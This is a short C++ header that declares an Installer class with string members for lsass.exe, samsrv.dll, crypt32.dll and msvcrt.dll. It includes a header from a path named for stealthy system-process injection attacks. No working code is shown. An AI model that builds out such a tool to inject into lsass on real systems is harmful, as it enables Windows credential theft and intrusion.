#include "../../../MemWarsAttackServices/SystemProcessInjectionAttack/StealthyMemManipulatorInstaller.h"
#include <string>

using namespace std;

class Installer {
public:
    void Init();
    wstring samsrvDll;
    wstring msvcrtDll;
    wstring crypt32Dll;
    wstring lsassExe;
};